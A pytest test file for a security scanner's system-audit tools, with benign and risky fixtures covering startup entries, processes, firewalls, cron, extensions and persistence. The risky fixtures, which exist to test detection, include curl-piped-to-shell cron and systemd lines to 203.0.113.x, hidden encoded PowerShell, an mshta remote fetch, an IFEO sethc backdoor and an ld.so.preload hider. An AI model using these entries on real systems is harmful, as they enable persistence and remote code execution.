"""Tools 061-070 (system security): benign and risky fixtures; local modes only where they are read-only and safe."""
import base64
import io
import json
import os
import platform
import stat
import zipfile

import pytest

from conftest import b64, ids, no_secret_leak

TODAY = "2026-11-10"
FAKE_STRIPE = "sk_" + "live_abcdefghijklmnopqrstuvwx"  # fake, split so the source holds no full token

# ---- 061 installed software ------------------------------------------------------------------
SW = "cyberscan.system.installed-software"


def test_061_current_software_is_clean(run):
    result = run(SW, {"software": [{"name": "Python 3.13.1 (64-bit)", "version": "3.13.1", "publisher": "Python Software Foundation"},
                                   {"name": "7-Zip 24.09", "version": "24.09", "publisher": "Igor Pavlov"}], "today": TODAY})
    assert result["classification"] == "clean", result["findings"]


def test_061_end_of_life_and_remote_access(run):
    software = [{"name": "Python 3.8.10 (64-bit)", "version": "3.8.10", "publisher": "Python Software Foundation"},
                {"name": "Adobe Flash Player 32 NPAPI", "version": "32.0.0.465", "publisher": "Adobe"},
                {"name": "Node.js", "version": "18.20.4", "publisher": "Node.js Foundation"},
                {"name": "AnyDesk", "version": "8.0", "publisher": "AnyDesk Software GmbH"},
                {"name": "Updater", "version": "1.0", "install_location": "C:\\Users\\bob\\AppData\\Roaming\\Updater"}]
    result = run(SW, {"software": software, "today": TODAY})
    found = ids(result)
    assert {"eol.python.3.8", "eol.flash", "eol.nodejs.18"} <= found
    assert any(f.startswith("remote-access.") for f in found) and any(f.startswith("user-writable-install.") for f in found)
    assert all(f["assurance"] == "verified_condition" for f in result["findings"] if f["id"].startswith("eol."))
    assert result["artifacts"]["lifecycle_table_date"] == "2026-11-10"


def test_061_local_mode_off_windows_is_unsupported(run):
    result = run(SW, {"source": "local", "today": TODAY})
    if platform.system() == "Windows":
        assert result["status"] == "success" and result["artifacts"]["software_count"] >= 0
    else:
        assert result["status"] == "unsupported"


# ---- 062 startup entries ---------------------------------------------------------------------
ST = "cyberscan.system.startup-entries"
REG = r"""Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"OneDrive"="\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background"
"Updater"="C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe"
"Helper"="powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAaQAnAA=="

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
"Vendor"="C:\\Program Files\\Vendor App\\agent.exe -silent"
"Sync"="mshta.exe https://example.test/a.hta"
"""


def test_062_reg_export(run):
    result = run(ST, {"reg_export": REG})
    found = ids(result)
    assert {"autostart.transient-path", "autostart.masquerade", "autostart.encoded-powershell", "autostart.unquoted-path"} <= found
    assert any("mshta" in f for f in found)
    assert result["artifacts"]["entry_count"] == 5 and result["classification"] == "suspicious"
    onedrive = [f for f in result["findings"] if f["location"] and "onedrive" in f["location"]]
    assert onedrive == []


def test_062_benign_list(run):
    result = run(ST, {"entries": [{"name": "SecurityHealth", "command": "%windir%\\system32\\SecurityHealthSystray.exe"},
                                  {"name": "Teams", "command": "\"C:\\Program Files\\WindowsApps\\MSTeams\\ms-teams.exe\" msteams:system-initiated"}]})
    assert result["classification"] == "clean", result["findings"]


# ---- 063 processes ---------------------------------------------------------------------------
PR = "cyberscan.system.process-security"


def test_063_suspicious_processes(run):
    procs = [
        {"pid": 4, "name": "System"}, {"pid": 700, "name": "lsass.exe", "exe": "C:\\Windows\\System32\\lsass.exe"},
        {"pid": 701, "name": "lsass.exe", "exe": "C:\\Users\\Public\\lsass.exe"},
        {"pid": 900, "name": "powershell.exe", "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "cmdline": "powershell.exe -ep bypass -w hidden -c iwr http://x.test/p -Headers @{Authorization='Bearer ' + FAKE_STRIPE + '}",
         "parent": "WINWORD.EXE"},
        {"pid": 950, "name": "scvhost.exe", "exe": "C:\\ProgramData\\scvhost.exe"},
    ]
    result = run(PR, {"processes": procs})
    found = ids(result)
    assert {"process.duplicate.lsass.exe", "process.office-spawns-shell", "process.lookalike-name", "process.transient-path"} <= found
    no_secret_leak(result, FAKE_STRIPE)


def test_063_normal_processes_and_local_snapshot(run):
    normal = [{"pid": 1, "name": "svchost.exe", "exe": "C:\\Windows\\System32\\svchost.exe", "cmdline": "svchost.exe -k netsvcs", "parent": "services.exe"},
              {"pid": 2, "name": "chrome.exe", "exe": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "parent": "explorer.exe"}]
    assert run(PR, {"processes": normal})["classification"] == "clean"
    local = run(PR, {"source": "local"})
    assert local["status"] == "success" and local["artifacts"]["process_count"] > 0


# ---- 064 firewall ----------------------------------------------------------------------------
FW = "cyberscan.system.firewall-config"
PROFILES = """
Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound

Private Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       AllowInbound,AllowOutbound
"""
RULES = """
Rule Name:                            Remote Desktop - User Mode (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            3389
RemotePort:                           Any
Action:                               Allow

Rule Name:                            File and Printer Sharing (SMB-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain
LocalIP:                              Any
RemoteIP:                             10.0.0.0/8
Protocol:                             TCP
LocalPort:                            445
Action:                               Allow
"""


def test_064_windows(run):
    result = run(FW, {"profiles": PROFILES, "rules": RULES})
    found = ids(result)
    assert {"windows.profile-off.public", "windows.allow-inbound.public", "windows.rule-exposes.3389"} <= found
    assert "windows.rule-exposes.445" not in found  # restricted to 10.0.0.0/8


def test_064_linux(run):
    ipt = "*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -s 10.0.0.0/8 --dport 5432 -j ACCEPT\nCOMMIT\n"
    found = ids(run(FW, {"iptables": ipt}))
    assert {"iptables.input-accept", "iptables.forward-accept", "iptables.exposes.22"} <= found
    hardened = "*filter\n:INPUT DROP [0:0]\n:FORWARD DROP [0:0]\n:OUTPUT ACCEPT [0:0]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\nCOMMIT\n"
    assert run(FW, {"iptables": hardened})["classification"] == "clean"
    assert "ufw.inactive" in ids(run(FW, {"ufw": "Status: inactive"}))
    ufw = "Status: active\nDefault: deny (incoming), allow (outgoing)\n\nTo                         Action      From\n--                         ------      ----\n3389/tcp                   ALLOW IN    Anywhere\n"
    assert "ufw.exposes.3389" in ids(run(FW, {"ufw": ufw}))
    assert run(FW, {"profiles": "garbage"})["status"] == "invalid_input"


# ---- 065 update status -----------------------------------------------------------------------
UP = "cyberscan.system.update-status"


def test_065_windows_lifecycle_and_hotfix_age(run):
    old = run(UP, {"windows": {"build": 19045, "ubr": 5000, "edition": "Professional"}, "today": TODAY,
                   "hotfixes": "Source,Description,HotFixID,InstalledBy,InstalledOn\nPC,Security Update,KB5031356,SYSTEM,7/12/2026\n"})
    assert {"windows.unsupported", "windows.stale-patches"} <= ids(old)
    # 24H2 Home/Pro ended 2026-10-13, before TODAY, so the current consumer release is 25H2 (build 26200)
    lapsed = run(UP, {"windows": {"build": 26100, "edition": "Professional"}, "today": TODAY})
    assert "windows.unsupported" in ids(lapsed)
    current = run(UP, {"windows": {"build": 26200, "ubr": 2000, "edition": "Professional"}, "today": TODAY,
                       "hotfixes": "Source,Description,HotFixID,InstalledBy,InstalledOn\nPC,Security Update,KB5070000,SYSTEM,10/20/2026\n"})
    assert current["classification"] == "clean", current["findings"]
    ltsc = run(UP, {"windows": {"build": 19044, "edition": "EnterpriseS"}, "today": TODAY})
    assert "windows.unsupported" not in ids(ltsc)  # LTSC 2021 is supported until 2027


def test_065_linux(run):
    result = run(UP, {"os_release": 'ID=ubuntu\nVERSION_ID="20.04"\nPRETTY_NAME="Ubuntu 20.04.6 LTS"', "today": TODAY,
                      "apt_upgradable": "Listing...\nopenssl/focal-security 1.1.1f-1ubuntu2.24 amd64 [upgradable from: 1.1.1f-1ubuntu2.20]\n"
                                        "vim/focal-updates 2:8.1 amd64 [upgradable from: 2:8.0]\n"})
    assert {"linux.unsupported", "apt.security-pending"} <= ids(result)
    assert result["artifacts"]["apt"] == {"upgradable": 2, "security": 1}
    assert run(UP, {"today": TODAY})["status"] == "invalid_input"


# ---- 066 permissions -------------------------------------------------------------------------
PM = "cyberscan.system.local-permissions"
LS = """/home/bob:
total 16
drwx------ 2 bob bob 4096 Jan  1 10:00 .ssh
-rw-r--r-- 1 bob bob 1679 Jan  1 10:00 id_rsa
-rwxrwxrwx 1 bob bob  220 Jan  1 10:00 deploy.sh
-rwsr-xr-x 1 root root 16000 Jan  1 10:00 helper
drwxrwxrwt 2 root root 4096 Jan  1 10:00 scratch
"""
ICACLS = r"""C:\Program Files\Vendor BUILTIN\Users:(OI)(CI)(M)
                        NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                        BUILTIN\Administrators:(OI)(CI)(F)
C:\Data Everyone:(OI)(CI)(RX)
Successfully processed 2 files; Failed processing 0 files
"""


def test_066_ls_and_icacls(run):
    found = ids(run(PM, {"ls_output": LS}))
    assert {"perm.secret-readable", "perm.world-writable", "perm.setuid"} <= found
    result = run(PM, {"icacls_output": ICACLS})
    assert [f["location"] for f in result["findings"]] == [r"C:\Program Files\Vendor"]


def test_066_local_walk_of_a_temp_folder(run, tmp_path):
    secret = tmp_path / "server.key"
    secret.write_text("not a real key")
    shared = tmp_path / "shared.txt"
    shared.write_text("x")
    if os.name != "nt":
        os.chmod(secret, 0o644)
        os.chmod(shared, 0o666)
    result = run(PM, {"paths": [str(tmp_path)], "max_depth": 1})
    assert result["status"] in ("success", "partial") and result["artifacts"]["entries_checked"] >= 3
    if os.name != "nt":
        assert {"perm.secret-readable", "perm.world-writable"} <= ids(result)


# ---- 067 scheduled tasks ---------------------------------------------------------------------
TK = "cyberscan.system.scheduled-tasks"
TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<!-- \\Updater -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\\Updater</URI></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Hidden>true</Hidden></Settings>
  <Actions Context="Author"><Exec><Command>C:\\Users\\Public\\upd.exe</Command><Arguments>/q</Arguments></Exec></Actions>
</Task>
<!-- \\Microsoft\\Windows\\Defrag\\ScheduledDefrag -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>Microsoft Corporation</Author><URI>\\Microsoft\\Windows\\Defrag\\ScheduledDefrag</URI></RegistrationInfo>
  <Principals><Principal id="LocalSystem"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Actions Context="LocalSystem"><Exec><Command>%windir%\\system32\\defrag.exe</Command><Arguments>-c -h -o</Arguments></Exec></Actions>
</Task>
"""


def test_067_windows_tasks(run):
    result = run(TK, {"task_xml": TASK_XML})
    found = ids(result)
    assert {"task.transient-path", "task.privileged-suspicious", "task.hidden-privileged-autostart"} <= found
    assert not any("Defrag" in (f["location"] or "") for f in result["findings"])
    assert run(TK, {"task_xml": "<!DOCTYPE x [<!ENTITY a 'b'>]><Task/>"})["status"] == "invalid_input"


def test_067_cron(run):
    cron = "SHELL=/bin/sh\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n" \
           "* * * * * root curl -fsSL http://203.0.113.5/x.sh | sh\n@reboot root nohup /tmp/.x/kworker >/dev/null 2>&1 &\n"
    found = ids(run(TK, {"crontab": cron}))
    assert {"cron.frequent-download", "cron.reboot-transient", "cron.root-user-path"} <= found
    assert any("download-piped-to-shell" in f for f in found)


# ---- 068 browser extensions ------------------------------------------------------------------
BX = "cyberscan.system.browser-extensions"
GOOD_MANIFEST = {"manifest_version": 3, "name": "Dark Reader-like", "version": "1.0", "permissions": ["storage"],
                 "host_permissions": ["https://example.test/*"]}
BAD_MANIFEST = {"manifest_version": 2, "name": "Coupon Helper", "version": "1.0",
                "permissions": ["<all_urls>", "cookies", "webRequest", "webRequestBlocking", "nativeMessaging"],
                "content_scripts": [{"matches": ["<all_urls>"], "js": ["c.js"], "all_frames": True, "run_at": "document_start"}],
                "web_accessible_resources": ["inject.js"], "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
                "update_url": "https://updates.example.test/ext.xml"}


def test_068_manifests(run):
    assert run(BX, {"manifest": json.dumps(GOOD_MANIFEST)})["classification"] == "clean"
    result = run(BX, {"manifest": json.dumps(BAD_MANIFEST)})
    found = ids(result)
    assert {"extension.manifest-v2", "extension.web-accessible-all", "extension.early-all-frames"} <= found
    assert any("session" in f for f in found) and result["classification"] == "suspicious"


def test_068_crx_package(run):
    zipped = io.BytesIO()
    with zipfile.ZipFile(zipped, "w") as archive:
        archive.writestr("manifest.json", json.dumps(BAD_MANIFEST))
    crx3 = b"Cr24" + (3).to_bytes(4, "little") + (4).to_bytes(4, "little") + b"\x00" * 4 + zipped.getvalue()
    result = run(BX, {"data_base64": b64(crx3), "file_name": "coupon.crx"})
    assert result["artifacts"]["extensions"][0]["name"] == "Coupon Helper"
    assert run(BX, {"data_base64": b64(b"not a zip at all")})["status"] == "invalid_input"


# ---- 069 configuration -----------------------------------------------------------------------
CF = "cyberscan.system.config-auditor"
WEAK_REG = r"""Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
"EnableLUA"=dword:00000000
"LocalAccountTokenFilterPolicy"=dword:00000001

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest]
"UseLogonCredential"=dword:00000001

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]
"LmCompatibilityLevel"=dword:00000001
"RunAsPPL"=dword:00000001

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
"SMB1"=dword:00000001
"RequireSecuritySignature"=dword:00000001
"""


def test_069_windows_registry(run):
    result = run(CF, {"reg_export": WEAK_REG})
    found = ids(result)
    assert {"windows.uac.disabled", "windows.uac.remote-token", "windows.wdigest.cleartext", "windows.lsa.lm-ntlmv1", "windows.smb.v1-server"} <= found
    assert "windows.lsa.no-ppl" not in found and "windows.smb.signing-not-required" not in found
    assert any("not in the export" in l for l in result["limitations"])  # e.g. LLMNR key absent: not judged


def test_069_sysctl(run):
    weak = "kernel.randomize_va_space = 0\nfs.protected_symlinks = 0\nnet.ipv4.ip_forward = 1\nkernel.kptr_restrict = 1\n"
    found = ids(run(CF, {"sysctl": weak}))
    assert {"sysctl.kernel.randomize_va_space", "sysctl.fs.protected_symlinks", "sysctl.net.ipv4.ip_forward"} <= found
    assert "sysctl.kernel.kptr_restrict" not in found


# ---- 070 persistence -------------------------------------------------------------------------
PS = "cyberscan.system.persistence-auditor"
PERSIST_REG = r"""Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
"Shell"="explorer.exe, C:\\ProgramData\\shellx.exe"
"Userinit"="C:\\Windows\\system32\\userinit.exe,"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe]
"Debugger"="C:\\Windows\\System32\\cmd.exe"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]
"Security Packages"=hex(7):6b,00,65,00,72,00,62,00,65,00,72,00,6f,00,73,00,00,00,6d,00,69,00,6d,00,69,00,6c,00,69,00,62,00,00,00,00,00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WSearch]
"ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,53,00,65,00,61,00,72,00,63,00,68,00,49,00,6e,00,64,00,65,00,78,00,65,00,72,00,2e,00,65,00,78,00,65,00,00,00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VendorSvc]
"ImagePath"="C:\\Program Files\\Vendor Tools\\svc.exe"
"""


def test_070_windows(run):
    result = run(PS, {"reg_export": PERSIST_REG})
    found = ids(result)
    assert {"winlogon.shell", "ifeo.debugger.sethc.exe", "lsa.security-package", "service.unquoted-path"} <= found
    assert "winlogon.userinit" not in found
    assert not any("wsearch" in (f["location"] or "") for f in result["findings"])  # %SystemRoot% service path is normal


def test_070_linux(run):
    files = [
        {"path": "/etc/ld.so.preload", "content": "/usr/lib/libprocesshider.so\n"},
        {"path": "/etc/systemd/system/backup.service", "content": "[Service]\nExecStart=/usr/bin/rsync -a /srv /mnt/backup\n"},
        {"path": "/etc/systemd/system/kworker.service", "content": "[Service]\nExecStart=/bin/bash -c 'curl -s http://203.0.113.9/k | bash'\n"},
        {"path": "/home/bob/.bashrc", "content": "export PATH=$PATH:~/bin\nalias sudo='sudo-capture'\n"},
        {"path": "/root/.ssh/authorized_keys", "content": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyOnly root@host\n"},
    ]
    found = ids(run(PS, {"files": files}))
    assert {"linux.ld-preload", "shellrc.hijack", "ssh.root-key-unrestricted"} <= found
    assert any(f.startswith("systemd.") and "download" in f for f in found)
    assert run(PS, {})["status"] == "invalid_input"


# ---- regressions from a real Windows host (false positives found in local-mode smoke runs) --------
def test_064_rules_without_program_field_are_not_called_open(run):
    app_rule = ("Rule Name:                            Dolby Access\n----\nEnabled:                              Yes\nDirection:                            In\n"
                "Profiles:                             Domain,Private,Public\nRemoteIP:                             Any\nProtocol:                             Any\n"
                "LocalPort:                            Any\nAction:                               Allow\n")
    result = run(FW, {"rules": app_rule})
    assert "windows.rule-any-any" not in ids(result) and any("verbose" in l for l in result["limitations"])
    unrestricted = app_rule.replace("Action:", "Program:                              Any\nService:                              Any\nAction:")
    assert "windows.rule-any-any" in ids(run(FW, {"rules": unrestricted}))


def test_067_builtin_task_with_resource_string_author(run):
    xml = (r'<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><RegistrationInfo><Author>$(@%SystemRoot%\system32\x.dll,-600)</Author>'
           r'<URI>\Microsoft\Windows\DirectX\DXGIAdapterCache</URI></RegistrationInfo><Triggers><LogonTrigger/></Triggers>'
           '<Principals><Principal><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>'
           '<Settings><Hidden>true</Hidden></Settings><Actions><ComHandler><ClassId>{00000000-0000-0000-0000-000000000000}</ClassId></ComHandler></Actions></Task>')
    assert run(TK, {"task_xml": xml})["findings"] == []


def test_068_edge_store_update_url_is_official(run):
    manifest = {"manifest_version": 3, "name": "Edge add-on", "version": "1", "permissions": ["storage"],
                "update_url": "https://edge.microsoft.com/extensionwebstorebase/v1/crx"}
    assert run(BX, {"manifest": json.dumps(manifest)})["classification"] == "clean"
